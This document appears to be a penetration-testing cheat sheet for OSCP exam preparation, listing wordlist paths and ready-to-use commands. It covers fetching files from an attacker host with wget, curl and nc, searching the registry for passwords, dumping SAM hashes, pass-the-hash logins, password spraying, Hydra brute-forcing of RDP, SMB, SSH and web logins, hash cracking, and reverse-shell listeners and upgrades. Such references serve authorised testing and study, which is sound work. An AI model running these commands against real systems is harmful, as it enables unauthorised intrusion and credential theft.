∂# OSCP-handytools
- https://github.com/seal9055/oscp-notes/blob/main/README.md
- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/tree/main
- https://github.com/Ak500k/oscp-notes?tab=readme-ov-file
- https://zweilosec.github.io/posts/upgrade-linux-shell/
  
# Wordlists
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
```

# Post Exploitation Linux
## File upload
- Starting Web Server
`python3 -m http.server 80`

- Filetransfer
```
wget <LHOST>/<file>
curl http://<LHOST>/<file> -o <output-file>
echo "GET /<file> HTTP/1.0" | nc -n <LHOST> 80 > <out-file> && sed -i '1,7d' <out-file>
```

- Secure Filetransfers
```
on target:  ncat -nvlp <port> --ssl > <out-file>
on kali:  ncat -nv <RHOST> <RPORT> --ssl < <file-to-send>
```

# Passwords
- Use chisel to remotely forward port 445, and use winexe to log in
`winexe -U <user>%<password> //<RHOST> cmd.exe`

- Check for passwords
`reg query HKLM /f password /t REG_SZ /s`
`reg query HKCU /f password /t REG_SZ /s`

- Weak Permissions on Sam Files
`python2 pwdump.py <SYSTEMFILE> <SAMFILE>`

- Cracking the password
`hashcat -m 1000 --force <hash> <wordlist>`

- PTH
`pth-winexe -U '<entire-hash>' //<RHOST> cmd.exe`


# Password Spraying
- Create Password List
`crunchy <length> <length> -t <pw-core>%%%% `

- Spray
`rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`

# Hashcracking
- John
`john --format=<fomrat> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

- Hashcat
```
hashcat -m <hashid> -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt -O  
hashcat -m <hashid> -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt -O -r /usr/share/hashcat/rules/best64.rule  
cat pw | hashcat -r/usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
```

# Bruteforcing
RDP Brute Force - Hydra
`hydra -L /usr/share/wordlists/rockyou.txt t -p "<password" rdp://<IP>`

SMB Brute Force - Hydra
`hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt <IP> smb`

SSH Brute Force - Hydra
`hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>`

HTTP POST Login Form Brute Force - Hydra
`hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Login" -vV -f`

HTTP GET Login Form Brute Force - Hydra
`hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login`

# MISC
SSH Encrypted
`/usr/share/john/ssh2john`

Crack Zip Pw
`fcrackzip -uvDp /usr/share/wordlists/rockyou.txt file.zip`

Tcp Dump
`sudo tcpdump -i tun0 icmp`

Images
- `binwalk <image>`
- `binwalk -Me <image>`

# Upgrade Linux Shell
check python version used in box
`which python python2 python3`

- Method 1: using Python
`python -c 'import pty;pty.spawn("/bin/bash")'; #spawn a python psuedo-shell`

- Method 2: Using Script
`script -qc /bin/bash /dev/nullscript -qc /bin/bash /dev/null`

# Upgrade Windows Shell
`rlwrap nc -lvnp $port`

# improve presentation of shell i.e. browse command history
`rlwrap nc -lvnp $port`

# Tools to make life easier
-> revshell generator
https://www.revshells.com/ 

-> CyberChef
https://gchq.github.io/CyberChef/

-> urlencoder
https://www.urlencoder.org/

-> octal
http://www.unit-conversion.info/texttools/octal/

-> hex
http://www.unit-conversion.info/texttools/octal/

-> IP converter
https://www.silisoftware.com/tools/ipconverter.php

-> How to Zip and Unzip Files Using PowerShell
https://zweilosec.github.io/posts/zip-unzip-files-powershell/ 
